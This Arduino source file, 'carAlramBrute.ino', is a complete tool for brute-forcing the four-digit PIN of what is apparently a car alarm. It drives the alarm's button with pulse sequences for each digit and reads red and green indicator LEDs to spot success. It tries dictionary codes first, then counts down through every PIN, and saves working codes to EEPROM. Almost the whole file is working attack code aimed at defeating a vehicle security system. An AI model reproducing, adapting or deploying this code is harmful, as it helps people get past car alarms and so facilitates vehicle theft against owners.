/*
 Name:		carAlramBrute.ino
 Created:	28.01.2018 19:01:59
 Author:	misha
*/
#include <EEPROM.h>
#include "dictionary.h"
const int BUTTON = 3;
const int RED = 4;
const int GREEN = 5;

bool enterPas(short a);
void eeprom_write_short(short adrr,short value);
short eeprom_read_short(short adrr);
int compare(const void * x1, const void * x2)   // функция сравнения элементов массива
{
	return (*(int*)x2 - *(int*)x1);              // если результат вычитания равен 0, то числа равны, < 0: x1 < x2; > 0: x1 > x2
}
void setup() {
	Serial.begin(115200);
	pinMode(13, OUTPUT);
	pinMode(BUTTON, OUTPUT);
	pinMode(RED, INPUT);
	pinMode(GREEN, INPUT);
	digitalWrite(BUTTON, 0);
	//eeprom_write_short(0,9743);
	//eeprom_write_short(2,4579);
	//eeprom_write_short(4,-1);
	short lastConstDict = 0;
	short dictLength = 0;
	short lastEepromDict = 0;
	short pasW = 0;
	for (lastConstDict = 0; dict[lastConstDict] != -1; lastConstDict++);
	short dataRead = eeprom_read_short(0);
	for (lastEepromDict = 2; dataRead != -1; lastEepromDict += 2)
	{
		dict[lastConstDict] = dataRead;
		Serial.println(dataRead);
		lastConstDict++;
		dataRead = eeprom_read_short(lastEepromDict);
	}
	lastEepromDict-=2;
	dict[lastConstDict] = -1;
	Serial.println("Begin BruteForce with dictionary");
	for (short i = 0; dict[i] != -1; i++) {
		if (enterPas(dict[i])) {
			pasW = dict[i];
			Serial.println("password found! In dictionary It's");
			Serial.println(((int)pasW));
			return;
		}
		dictLength++;
		delay(5100);
	}

	qsort(dict, dictLength, sizeof(short), compare);
	Serial.println("qsort");
	for (short i = 0; dict[i] != -1; i++) {
		Serial.println(((int)dict[i]));
	}
	Serial.println("Begin BruteForce all pins");
	dictLength = 0;
	short j = 0; 
	for (short i = 2224; i >= 0; i--) {
			if (dict[j] == i) {
				Serial.print("Skip.............");
				Serial.println(((int)j));
				j++;
				continue;
			}
			if (enterPas(i)) {
				Serial.print("lastEepromDict");
				Serial.println(((int)lastEepromDict));
				if (lastEepromDict < 1010) {
					Serial.println("Writing....");
					eeprom_write_short(lastEepromDict, i);
					eeprom_write_short(lastEepromDict+2, -1);
				}
				pasW = i;
				break;
			}
				delay(5100);
		}
	Serial.println("password found! It's");
	Serial.println(((int)pasW));
	
}

// the loop function runs over and over again until power down or reset
void loop() {
		
	digitalWrite(13, 1);
	delay(500);
	digitalWrite(13, 0);
	delay(500);
	
}
bool enterPas(short a) {
	char m[4] = {0}, i = 3;
	while (a>0)
	{
		m[i] = a % 10;
		a = a / 10;
		i--;
	}

	for (i = 0; i < 4; i++)
		Serial.print(((int)m[i]));

	for (i=0; i < 4; i++) {
		if (m[i] == 0)
			m[i] = 10;
		for (char j = 0; j < m[i]; j++) {
			digitalWrite(BUTTON, 1);
			while (!(digitalRead(GREEN) || digitalRead(RED)));
			delay(100);
			digitalWrite(BUTTON, 0);
			while ((digitalRead(GREEN) || digitalRead(RED)));
			delay(100);
		}
		while (!(digitalRead(GREEN) || digitalRead(RED)));
		while (digitalRead(GREEN) || digitalRead(RED)) {
			if (i == 3)
				if (digitalRead(GREEN)) {
					Serial.println("True PAS");
					return true;
				}
		}
	}
	Serial.println("Fail");
	return false;
}
void eeprom_write_short(short adrr,short value) {
	EEPROM.update(adrr, lowByte(value));
	EEPROM.update(adrr + 1, highByte(value));
}
short eeprom_read_short(short adrr) {
	return word(EEPROM.read(adrr+1), EEPROM.read(adrr));
}